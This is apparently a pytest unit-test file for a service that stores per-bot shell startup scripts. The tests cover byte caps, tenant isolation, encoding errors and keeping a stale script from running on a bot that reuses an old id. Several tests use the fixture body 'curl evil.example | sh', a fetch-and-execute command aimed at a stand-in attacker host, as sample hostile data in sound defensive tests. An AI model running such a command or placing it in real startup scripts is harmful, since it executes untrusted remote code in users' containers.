"""Unit tests for BotStartupScriptService — the rules the repository doesn't own."""
import json

import pytest

from agentclaw.community.core.bot_startup_script.services.startup_script_service import (
    MAX_SCRIPT_BYTES,
    BotStartupScriptService,
    StartupScriptNotEncodableError,
    StartupScriptTooLargeError,
)


class FakeRepo:
    """In-memory stand-in keyed exactly like the real one."""

    def __init__(self):
        self.rows = {}

    def get(self, *, env, entity_id, bot_id):
        return self.rows.get((env, entity_id, bot_id))

    def upsert(
        self, *, env, entity_id, bot_id, script, size_bytes, modifier, bot_incarnation
    ):
        from agentclaw.community.core.bot_startup_script.repository.models import (
            BotStartupScriptRecord,
        )

        from agentclaw.community.core.bot_startup_script.errors import (
            StartupScriptSupersededError,
        )

        existing = self.rows.get((env, entity_id, bot_id))
        if existing is not None and existing.bot_incarnation > bot_incarnation:
            # Mirrors the real repository: a write from a bot older than the
            # row's current owner is refused rather than applied.
            raise StartupScriptSupersededError(
                stored_incarnation=existing.bot_incarnation,
                writing_incarnation=bot_incarnation,
            )
        rec = BotStartupScriptRecord(
            id=1, env=env, entity_id=entity_id, bot_id=bot_id,
            script=script, size_bytes=size_bytes, modifier=modifier,
            bot_incarnation=bot_incarnation,
        )
        self.rows[(env, entity_id, bot_id)] = rec
        return rec

    def delete(self, *, env, entity_id, bot_id):
        return self.rows.pop((env, entity_id, bot_id), None) is not None

    def delete_written_by(self, *, env, entity_id, bot_id, bot_incarnation):
        row = self.rows.get((env, entity_id, bot_id))
        if row is None or row.bot_incarnation != bot_incarnation:
            return False
        del self.rows[(env, entity_id, bot_id)]
        return True


class _FakeTeclaw:
    """Stands in for TeclawProvisionService — the canonical engine authority.

    Mirrors its real ``is_teclaw``: a configured set, matched case-insensitively,
    not a literal comparison. The service must delegate here rather than compare
    engine strings itself.
    """

    def __init__(self, engine_types=("teclaw",)):
        self._types = {e.strip().lower() for e in engine_types}

    def is_teclaw(self, active_engine):
        engine = (active_engine or "").strip().lower()
        return bool(engine) and engine in self._types


@pytest.fixture
def svc():
    return BotStartupScriptService(FakeRepo(), lambda: _FakeTeclaw())


def test_get_returns_none_when_never_set(svc):
    assert svc.get(entity_id="ent", bot_id="bot", bot_incarnation=1) is None


def test_put_computes_size_in_utf8_bytes_not_characters(svc):
    """A multibyte body must be measured in bytes — the cap is a byte budget."""
    body = "echo 你好"  # 8 chars, 11 bytes
    rec = svc.put(entity_id="ent", bot_id="bot", script=body, modifier="u1", bot_incarnation=1)
    assert rec.size_bytes == len(body.encode("utf-8"))
    assert rec.size_bytes != len(body)


def test_put_records_the_modifier_it_is_given(svc):
    rec = svc.put(entity_id="ent", bot_id="bot", script="echo a", modifier="alice", bot_incarnation=1)
    assert rec.modifier == "alice"


def test_put_rejects_over_limit_naming_the_limit(svc):
    oversize = "x" * (MAX_SCRIPT_BYTES + 1)
    with pytest.raises(StartupScriptTooLargeError) as exc:
        svc.put(entity_id="ent", bot_id="bot", script=oversize, modifier="u1", bot_incarnation=1)
    assert str(MAX_SCRIPT_BYTES) in str(exc.value)
    assert exc.value.limit_bytes == MAX_SCRIPT_BYTES
    assert exc.value.size_bytes == MAX_SCRIPT_BYTES + 1


def test_put_accepts_a_body_exactly_at_the_limit(svc):
    """The cap is inclusive — off-by-one here would reject a legal script."""
    at_limit = "x" * MAX_SCRIPT_BYTES
    rec = svc.put(entity_id="ent", bot_id="bot", script=at_limit, modifier="u1", bot_incarnation=1)
    assert rec.size_bytes == MAX_SCRIPT_BYTES


def test_put_rejects_before_storing_anything(svc):
    oversize = "x" * (MAX_SCRIPT_BYTES + 1)
    with pytest.raises(StartupScriptTooLargeError):
        svc.put(entity_id="ent", bot_id="bot", script=oversize, modifier="u1", bot_incarnation=1)
    assert svc.get(entity_id="ent", bot_id="bot", bot_incarnation=1) is None


def test_delete_is_idempotent(svc):
    assert svc.delete(entity_id="ent", bot_id="bot") is False
    svc.put(entity_id="ent", bot_id="bot", script="echo a", modifier="u1", bot_incarnation=1)
    assert svc.delete(entity_id="ent", bot_id="bot") is True
    assert svc.delete(entity_id="ent", bot_id="bot") is False


def test_get_body_returns_empty_string_when_unset(svc):
    """The payload path composes a shell string and must never see None."""
    assert svc.get_body(entity_id="ent", bot_id="bot", bot_incarnation=1) == ""


def test_get_body_returns_the_stored_body(svc):
    svc.put(entity_id="ent", bot_id="bot", script="echo hello", modifier="u1", bot_incarnation=1)
    assert svc.get_body(entity_id="ent", bot_id="bot", bot_incarnation=1) == "echo hello"


def test_get_body_returns_empty_string_after_delete(svc):
    svc.put(entity_id="ent", bot_id="bot", script="echo hello", modifier="u1", bot_incarnation=1)
    svc.delete(entity_id="ent", bot_id="bot")
    assert svc.get_body(entity_id="ent", bot_id="bot", bot_incarnation=1) == ""


class TestResolveSupport:
    """Support is a property of the engine, asked of the engine's authority.

    Two things it deliberately does not consider: the bot type (personal and
    service share one allocator) and the bot's live container (so the answer is
    stable before the first start and while a lookup is failing).
    """

    def _bot(self, engine="openclaw", provider="baas"):
        return {
            "active_engine": engine,
            "bot_type": "personal",
            "device_binding": {"device_provider": provider},
        }

    def test_an_ordinary_bot_is_supported(self, svc):
        assert svc.resolve_support(self._bot()) == ("supported", "")

    def test_personal_and_service_bots_get_the_same_answer(self, svc):
        """They share one allocator and one payload builder."""
        personal = {**self._bot(), "bot_type": "personal"}
        service = {**self._bot(), "bot_type": "service"}
        assert svc.resolve_support(personal) == svc.resolve_support(service)

    def test_teclaw_bot_is_unsupported(self, svc):
        supported, reason = svc.resolve_support(self._bot(engine="teclaw"))
        assert supported == "unsupported"
        assert "teclaw" in reason

    def test_the_engine_test_is_delegated_not_reimplemented(self):
        """A configured teclaw-like engine must be refused without editing this
        feature. If support ever compares engine strings itself again, this fails.
        """
        svc = BotStartupScriptService(
            FakeRepo(), lambda: _FakeTeclaw(engine_types=("teclaw", "teclaw_next"))
        )
        assert svc.resolve_support(self._bot(engine="teclaw_next"))[0] == "unsupported"
        # ...and the authority's own casing rules apply, not ours.
        assert svc.resolve_support(self._bot(engine="TeClaw_Next"))[0] == "unsupported"

    def test_a_bot_with_no_binding_yet_is_supported(self, svc):
        """A bot is PENDING between create and first start — the moment an owner
        most wants to attach a script."""
        assert svc.resolve_support({"active_engine": "openclaw"}) == ("supported", "")

    def test_teclaw_with_no_binding_is_still_unsupported(self, svc):
        supported, reason = svc.resolve_support({"active_engine": "teclaw"})
        assert supported == "unsupported"
        assert "teclaw" in reason

    def test_a_desktop_bot_is_unsupported(self, svc):
        """DesktopBotService calls ``_get_start_cmd`` directly, bypassing the
        payload builder where the script is resolved — so it would never run."""
        supported, reason = svc.resolve_support(
            {**self._bot(), "bot_type": "desktop"}
        )
        assert supported == "unsupported"
        assert "desktop" in reason

    def test_one_answer_serves_both_the_read_and_the_write(self, svc):
        """Support is computed here and nowhere else. A guard that lived only on
        the write path would let GET advertise a bot whose PUT always fails."""
        desktop = {**self._bot(), "bot_type": "desktop"}
        assert svc.resolve_support(desktop) == svc.resolve_support(dict(desktop))
        assert svc.resolve_support(desktop)[0] == "unsupported"

    def test_the_answer_does_not_depend_on_live_container_state(self, svc):
        """The same bot must get the same answer whatever its binding says — a
        binding that is absent, present, half-read, or on any provider.

        This is the property the previous provider-keyed version lacked: it
        needed a third "could not determine" state purely because a lookup could
        fail, which made an unrelated blip look like a verdict about the bot.
        """
        answers = {
            svc.resolve_support(bot)
            for bot in (
                {"active_engine": "openclaw"},
                {"active_engine": "openclaw", "binding_id": 77},
                self._bot(provider="baas"),
                self._bot(provider="local"),
                self._bot(provider="arca"),
                {"active_engine": "openclaw", "device_binding": {}},
            )
        }
        assert answers == {("supported", "")}

    def test_there_is_no_third_state(self, svc):
        """Only SUPPORTED and UNSUPPORTED exist now; nothing returns "unknown"."""
        from agentclaw.community.core.bot_startup_script.services import _support

        assert not hasattr(_support, "UNKNOWN")


class TestTenantIsolation:
    """``ac_bots`` is tenant-guarded, so a bot_id is unique only within a tenant.

    Legacy "default" bots are documented as carrying residual cross-tenant
    collision on that identifier (``bots/router.py``). Without the tenant in this
    table's key, two such bots share one script row — so one tenant could read or
    overwrite the other's script, and the overwritten body would execute in the
    other tenant's container on its next start.
    """

    def test_the_model_declares_a_mapped_tenant_column(self):
        """The guard registrar rejects a model without one, but it is registered
        at import time — this asserts the column is *mapped*, which is the thing
        that makes the guard's WHERE clause real rather than ``WHERE 1 = 1``."""
        from sqlalchemy import inspect as sa_inspect

        from agentclaw.community.core.bot_startup_script.repository.models import (
            BotStartupScriptModel,
        )

        assert "avernet_tenant" in sa_inspect(BotStartupScriptModel).columns

    def test_a_full_width_entity_id_still_fits(self):
        """``ac_bots.entity_id`` is 1024 chars, so this column must be too.

        It was briefly narrowed to 256 to fit the uniqueness key, which traded
        an index problem for a truncation one: a bot with a longer entity id
        could not have a script stored at all. The key is bounded by a hashed
        surrogate now, so the column matches its source.
        """
        from agentclaw.community.core.bot_startup_script.repository.models import (
            BotStartupScriptModel,
        )

        assert BotStartupScriptModel.__table__.c.entity_id.type.length == 1024

    def test_the_unique_key_includes_the_tenant(self):
        """Two tenants colliding on (env, entity_id, bot_id) must be able to
        hold separate rows — a key without the tenant makes the second write
        overwrite the first."""
        from agentclaw.community.core.bot_startup_script.repository.models import (
            BotStartupScriptModel,
        )

        unique = [
            c
            for c in BotStartupScriptModel.__table__.constraints
            if c.__class__.__name__ == "UniqueConstraint"
        ]
        assert unique, "the table must keep a uniqueness constraint"
        assert any(
            "avernet_tenant" in {col.name for col in c.columns} for c in unique
        ), "the tenant must be part of the uniqueness key"

    def test_the_model_is_registered_with_the_tenant_guard(self):
        """Registration is what confines reads and stamps inserts; the column
        alone does nothing."""
        from agentclaw.community.core.bot_startup_script.repository.models import (
            BotStartupScriptModel,
        )
        from agentclaw.community.utils.avernet_tenant_guard import _GUARDED_MODELS

        assert BotStartupScriptModel in _GUARDED_MODELS


def test_the_service_imports_standalone():
    """Importing this module first must not raise.

    It briefly depended on ``TeclawProvisionService`` directly, which reaches
    ``service_bot`` → ``bot_service`` → ``default_image_policy_listener`` and
    back into the still-initialising ``teclaw_provision_service``. The suite hid
    it completely — something always imported that chain first — so only a
    standalone import catches it. That cycle is pre-existing and not this
    feature's to fix; what this pins is that the feature does not add a new
    entry point into it.
    """
    import subprocess
    import sys

    result = subprocess.run(
        [
            sys.executable,
            "-c",
            "from agentclaw.community.core.bot_startup_script.services"
            ".startup_script_service import BotStartupScriptService",
        ],
        capture_output=True,
        text=True,
    )
    assert result.returncode == 0, result.stderr


class TestModifierWidth:
    """``modifier`` is varchar(1024) and the actor is composed, not raw."""

    def test_an_over_long_actor_is_truncated_not_rejected(self, svc):
        """`app:{id}:on-behalf-of:{owner_id}` can exceed the column on its own,
        because owner_id is itself a 1024-character field. Failing the write
        would blame the caller for the platform's formatting."""
        from agentclaw.community.core.bot_startup_script.services import (
            startup_script_service as mod,
        )

        actor = "app:7:on-behalf-of:" + "u" * 2000
        record = svc.put(
            entity_id="ent", bot_id="bot", script="echo hi", modifier=actor
        , bot_incarnation=1)
        assert len(record.modifier) == mod.MAX_MODIFIER_CHARS
        # The acting application survives; only the delegating tail is lost.
        assert record.modifier.startswith("app:7:on-behalf-of:")

    def test_an_ordinary_actor_is_stored_verbatim(self, svc):
        record = svc.put(
            entity_id="ent", bot_id="bot", script="echo hi", modifier="alice"
        , bot_incarnation=1)
        assert record.modifier == "alice"


def test_the_uniqueness_key_fits_innodbs_index_limit():
    """A utf8mb4 index key is capped at 3072 bytes; over it, MySQL refuses the
    CREATE TABLE outright — the table simply would not exist in production.

    SQLite does not enforce this, so the whole local suite and every SQLite-
    backed test would pass against a table that can never be created. Hence an
    arithmetic check rather than a boot test.
    """
    from agentclaw.community.core.bot_startup_script.repository.models import (
        BotStartupScriptModel,
    )

    unique = [
        c
        for c in BotStartupScriptModel.__table__.constraints
        if c.__class__.__name__ == "UniqueConstraint"
    ]
    assert unique, "the table must keep a uniqueness constraint"

    for constraint in unique:
        chars = sum(
            getattr(col.type, "length", 0) or 0 for col in constraint.columns
        )
        assert chars * 4 <= 3072, (
            f"{constraint.name} is {chars} chars = {chars * 4} utf8mb4 bytes, "
            f"over InnoDB's 3072-byte index-key limit"
        )


def test_the_size_cap_leaves_the_base64_body_inside_a_mysql_text_column():
    """The hook carrying the body is persisted into a ``Text`` column downstream
    (``baas_bot.extra_config`` / ``baas_publish.extra_config``), which is 65,535
    bytes on MySQL. base64 costs 4/3, so a cap chosen without that arithmetic
    lets a caller store a script that is accepted and then fails to persist on
    the next restart — after the write already reported success.
    """
    import math

    from agentclaw.community.api.bot_startup_script_service import MAX_SCRIPT_BYTES

    encoded = math.ceil(MAX_SCRIPT_BYTES / 3) * 4
    mysql_text_limit = 65_535
    # Room for the platform's own hook plus the other extra_config fields.
    assert encoded + 8192 < mysql_text_limit, (
        f"{MAX_SCRIPT_BYTES} raw expands to {encoded} base64 bytes, which does "
        f"not leave usable room inside a {mysql_text_limit}-byte TEXT column"
    )


def test_a_lone_surrogate_is_refused_rather_than_crashing(svc):
    """JSON permits ``"\\ud800"`` and Pydantic's ``str`` passes it through; only
    the UTF-8 encode fails. Unmapped, that turns caller-controlled input into a
    500 — and the same encode feeds base64 downstream, so the body is unusable
    either way."""
    lone_surrogate = json.loads('{"s": "\\ud800"}')["s"]

    with pytest.raises(StartupScriptNotEncodableError):
        svc.put(
            entity_id="ent", bot_id="bot", script=lone_surrogate, modifier="alice"
        , bot_incarnation=1)


class TestAStaleRowIsInert:
    """The property that makes the cleanup paths hygiene rather than the only
    thing standing between a reused bot_id and someone else's executable code.

    Every earlier fix in this area removed the stale row: sweep it on delete,
    purge before the destructive steps, sweep again afterwards, re-check after a
    write. Each closed a way for the row to survive, and each depended on being
    reached. This does not: the row is stamped with the bot that wrote it, and
    a read for a different bot does not return it — so a row that survived
    *every* one of those paths still cannot execute on whoever inherits the id.
    """

    def _stored_by(self, svc, incarnation):
        svc.put(
            entity_id="ent",
            bot_id="bot",
            script="curl evil.example | sh",
            modifier="u1",
            bot_incarnation=incarnation,
        )

    def test_the_next_bot_to_hold_the_id_does_not_inherit_the_script(self, svc):
        self._stored_by(svc, 1)

        # Same (entity_id, bot_id) — the row was never cleaned up — but a
        # different bot: deletion is a soft update and create_bot takes a
        # caller-supplied bot_id, so this is a new bot wearing an old name.
        assert svc.get(entity_id="ent", bot_id="bot", bot_incarnation=2) is None
        assert svc.get_body(entity_id="ent", bot_id="bot", bot_incarnation=2) == ""

    def test_the_bot_that_wrote_it_still_reads_it(self, svc):
        """The check must not cost the owner their own script."""
        self._stored_by(svc, 1)

        assert svc.get(entity_id="ent", bot_id="bot", bot_incarnation=1) is not None
        assert (
            svc.get_body(entity_id="ent", bot_id="bot", bot_incarnation=1)
            == "curl evil.example | sh"
        )

    def test_rewriting_hands_the_row_to_the_writer(self, svc):
        """A new bot storing at the same key owns what it wrote.

        The stamp is re-applied on update, not only on insert — otherwise the
        first incarnation's stamp would outlive it and make the *new* owner's
        own script unreadable to them.
        """
        self._stored_by(svc, 1)
        svc.put(
            entity_id="ent",
            bot_id="bot",
            script="echo mine",
            modifier="u2",
            bot_incarnation=2,
        )

        assert svc.get_body(entity_id="ent", bot_id="bot", bot_incarnation=2) == (
            "echo mine"
        )
        assert svc.get_body(entity_id="ent", bot_id="bot", bot_incarnation=1) == ""

    def test_a_withdrawal_only_removes_its_own_row(self, svc):
        """Losing a race must not destroy the newcomer's script."""
        self._stored_by(svc, 2)  # the recreated bot has already written

        assert (
            svc.delete_written_by(entity_id="ent", bot_id="bot", bot_incarnation=1)
            is False
        )
        assert svc.get_body(entity_id="ent", bot_id="bot", bot_incarnation=2) != ""

    def test_the_deletion_sweep_removes_whatever_is_there(self, svc):
        """The sweep is unconditional on purpose — it is clearing the key, not
        withdrawing one writer's row."""
        self._stored_by(svc, 1)

        assert svc.delete(entity_id="ent", bot_id="bot") is True
        assert svc.get_body(entity_id="ent", bot_id="bot", bot_incarnation=1) == ""


class TestAKeyThatChangedHands:
    """Writes and deletes on a key whose owner can change between admission and
    execution. Each of these was an unconditional operation that would have hit
    a bot other than the one the request was addressed to."""

    def test_an_older_bots_write_cannot_overwrite_a_newer_ones_script(self, svc):
        """A stale PUT must not clobber the current owner.

        Worse than the overwrite itself: it would also stamp the row back to the
        dead incarnation, so the stale request's own withdrawal would then
        delete it and the new bot would be left with nothing.
        """
        from agentclaw.community.core.bot_startup_script.errors import (
            StartupScriptSupersededError,
        )

        svc.put(
            entity_id="ent",
            bot_id="bot",
            script="echo mine",
            modifier="u2",
            bot_incarnation=2,
        )

        with pytest.raises(StartupScriptSupersededError):
            svc.put(
                entity_id="ent",
                bot_id="bot",
                script="echo stale",
                modifier="u1",
                bot_incarnation=1,
            )

        assert svc.get_body(entity_id="ent", bot_id="bot", bot_incarnation=2) == (
            "echo mine"
        )

    def test_the_current_owner_can_still_replace_its_own_script(self, svc):
        """The rule is "older than the row", not "different from the row"."""
        svc.put(
            entity_id="ent",
            bot_id="bot",
            script="first",
            modifier="u1",
            bot_incarnation=2,
        )
        svc.put(
            entity_id="ent",
            bot_id="bot",
            script="second",
            modifier="u1",
            bot_incarnation=2,
        )

        assert svc.get_body(entity_id="ent", bot_id="bot", bot_incarnation=2) == (
            "second"
        )
